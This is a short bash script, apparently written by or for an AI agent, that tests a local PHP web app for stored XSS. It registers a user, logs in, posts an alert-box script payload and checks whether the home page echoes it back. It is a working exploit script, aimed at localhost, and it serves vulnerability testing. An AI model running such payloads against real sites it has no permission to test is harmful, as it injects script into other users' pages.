#!/bin/bash
set -x

# Generate a random username
USERNAME="testuser_$(date +%s)"
PASSWORD="password123"
XSS_PAYLOAD="<script>alert('XSS by Gemini')</script>"
BASE_URL="http://localhost:8080"
COOKIE_FILE="cookie.txt"

# 1. Register a new user
echo "Registering user $USERNAME..."
curl -v -s -L -c $COOKIE_FILE -X POST \
  -F "Usuario=Cadastrar" \
  -F "Login=$USERNAME" \
  -F "Nome=Test User" \
  -F "Senha=$PASSWORD" \
  "$BASE_URL/controller/usuario.php" > register.html

# 2. Login with the new user
echo "Logging in as $USERNAME..."
curl -v -s -L -b $COOKIE_FILE -c $COOKIE_FILE -X POST \
  -F "Usuario=Login" \
  -F "Login=$USERNAME" \
  -F "Senha=$PASSWORD" \
  "$BASE_URL/controller/usuario.php" > login.html

echo "Cookie file content:"
cat $COOKIE_FILE

# 3. Submit a post with XSS payload
echo "Submitting post with XSS payload..."
curl -v -s -L -b $COOKIE_FILE -c $COOKIE_FILE -X POST \
  -F "Postagem=Inserir" \
  -F "Mensagem=$XSS_PAYLOAD" \
  "$BASE_URL/controller/postagem.php" > post.html

# 4. Verify the XSS
echo "Verifying XSS on home page..."
curl -v -s -L -b $COOKIE_FILE "$BASE_URL/view/home.php" > home.html

# Check if the payload is in the response
if grep -q "$XSS_PAYLOAD" home.html; then
  echo "XSS vulnerability confirmed!"
  echo "Payload found in the home page."
else
  echo "XSS vulnerability not confirmed."
fi

# Keep the files for debugging
# rm $COOKIE_FILE register.html login.html post.html home.html
